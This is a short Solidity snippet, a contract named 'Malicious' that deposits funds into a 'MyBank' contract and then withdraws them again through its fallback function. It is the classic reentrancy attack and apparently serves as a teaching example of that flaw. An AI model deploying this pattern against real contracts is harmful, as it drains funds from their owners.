contract Malicious {
   uint balance;
   MyBank bank = MyBank(0xdeadbeef8badf00d...);
function Malicious(){
   balance = msg.value;
   bank.Deposit.value(balance)();
   bank.Withdraw.value(0)(balance); 
}
function (){ 
   bank.Withdraw.value(0)(balance);
}
}
